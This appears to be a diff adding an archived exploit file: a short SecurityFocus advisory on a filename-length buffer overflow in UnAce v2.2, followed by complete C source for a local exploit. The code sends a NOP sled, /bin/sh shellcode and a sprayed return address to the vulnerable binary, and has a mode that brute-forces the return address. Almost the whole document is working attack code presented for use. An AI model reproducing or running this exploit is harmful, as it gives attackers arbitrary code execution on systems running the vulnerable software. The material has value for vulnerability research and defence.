@@ -1,0 +1,204 @@
+source: http://www.securityfocus.com/bid/9002/info
+ 
+UnAce has been reported to be prone to a buffer overflow vulnerability. The issue presents itself when UnAce handles ace filenames that are of excessive length. When this filename is passed to the UnAce utility as an argument, the string is copied into a reserved buffer in memory. Data that exceeds the size of the reserved buffer will overflow its bounds and will trample any saved data that is adjacent to the affected buffer. Ultimately this may lead to the execution of arbitrary instructions in the context of the user who is running UnAce.
+
+/*Local exploit for unace v2.2 by Li0n7
+ *Bug reported by Andreas Constantinides <megahz@megahz.org>
+ *contact me: Li0n7@voila.fr
+ *visit us: ioc.fr.st
+ *tested on slackware 9.0
+ *usage: ./unace-exp[-r <RET>][-b [-s <STARTING_RET>][-d <DIFF>]]
+ *-r <RET>: try to exploit unace with specified <RET> as return address
+ *-b:       enables bruteforcing
+ *-s:       specify the first address to bruteforce
+ *-d:       the value to take away from the starting address at each bruteforcing iteration
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <errno.h>
+
+#define BSIZE   600
+#define SIZE    BSIZE*2
+#define D_DIFF  1
+#define D_START 0xbfffffff
+#define PATH    "/tmp/test/exploits/src/unace"
+#define RET     0xbffff73a
+
+char shellcode[]=
+      "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
+      "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+char *buffer,*ptr;
+
+void exec_culn();
+int tease();
+int make_string(long ret_addr);
+int bruteforce(long start,int diff);
+void banner(char *argv0);
+
+int
+main(int argc,char *argv[])
+{
+      char * option_list = "bd:r:s:";
+      int option,brute = 0,opterr = 0,diff = D_DIFF;
+      long ret,start = D_START;
+
+      banner(argv[0]);
+      if (argc < 1) exit(-1);
+
+      while((option = getopt(argc,argv,option_list)) != -1)
+          switch(option)
+          {
+              case 'b':
+                  brute = 1;
+                  break;
+              case 'd':
+                  diff = atoi(optarg);
+                  break;
+              case 'r':
+                  ret = strtoul(optarg,NULL,0);
+                  make_string(ret);
+                  tease();
+                  exit(0);
+                  break;
+              case 's':
+                  start = strtoul(optarg,NULL,0);
+                  break;
+              case '?':
+                  fprintf(stderr,"[-] option \'%c\' invalid\n",optopt);
+                  banner(argv[0]);
+                  exit(-1);
+          }
+
+      if(brute == 1)
+          bruteforce(start,diff);
+
+      return 0;
+}
+
+void
+exec_vuln()
+{
+      execl(PATH,PATH,"e",buffer,NULL);
+}
+
+
+int
+tease()
+{
+      pid_t pid;
+      pid_t wpid;
+      int status;
+
+      pid = fork();
+
+      if ( pid == -1 ) {
+          fprintf(stderr, " [-] %s: Failed to fork()\n", strerror(errno));
+          exit(13);
+
+      } else if ( pid == 0 ) {
+
+          exec_vuln();
+
+      } else  {
+
+         wpid = wait(&status);
+         if ( wpid == -1 ) {
+
+             fprintf(stderr,"[-] %s: wait()\n", strerror(errno));
+             return 1;
+
+         } else if ( wpid != pid )
+
+             abort();
+
+        else {
+
+            if ( WIFEXITED(status) ) {
+
+                printf("[+] Exited: shell's ret code = %d\n", WEXITSTATUS(status));
+                return WEXITSTATUS(status);
+
+            } else if ( WIFSIGNALED(status) ) {
+
+                return WTERMSIG(status);
+            } else {
+
+                fprintf(stderr, "[-] Stopped.\n");
+
+            }
+        }
+      }
+      return 1;
+}
+
+
+int
+make_string(long ret_addr)
+{
+      int i;
+      long ret,addr,*addr_ptr;
+
+      buffer = (char *)malloc(SIZE);
+
+      if(!buffer)
+      {
+          fprintf(stderr,"[-] Can't allocate memory, exiting...\n");
+          exit(-1);
+      }
+
+      ptr = buffer;
+
+      memset(ptr,0x90,BSIZE-strlen(shellcode));
+      ptr += BSIZE-strlen(shellcode);
+
+      for(i=0;i<strlen(shellcode);i++)
+          *ptr++ = shellcode[i];
+
+      addr_ptr = (long *)ptr;
+      for(i=0;i<100;i++)
+          *(addr_ptr++) = ret_addr;
+      ptr = (char *)addr_ptr;
+      *ptr = 0;
+
+      return 0;
+}
+
+
+int
+bruteforce(long start,int diff)
+{
+      int ret;
+      long i;
+
+      fprintf(stdout,"[+] Starting bruteforcing...\n");
+
+      for(i=start;i<0;i=i-diff)
+      {
+          fprintf(stdout,"[+] Testing 0x%x...\n",i);
+          make_string(i);
+          ret=tease();
+          if(ret==0)
+          {
+              fprintf(stdout,"[+] Ret address found: 0x%x\n",i);
+              break;
+          }
+      }
+
+      return 0;
+}
+
+void
+banner(char *argv0)
+{
+      fprintf(stderr,"\n    local exploit for unace v <= 2.2 by Li0n7\n");
+      fprintf(stderr,"    vulnerability reported by Andreas Constantinides <megahz@megahz.org>\n");
+      fprintf(stderr,"    visit us: http://www.ioc.fr.st\n");
+      fprintf(stderr,"    contact me: Li0n7[at]voila[dot]fr\n");
+      fprintf(stderr,"    usage: %s [-r <RET>][-b [-s <STARTING_RET>][-d <DIFF>]]\n\n",argv0);
+}
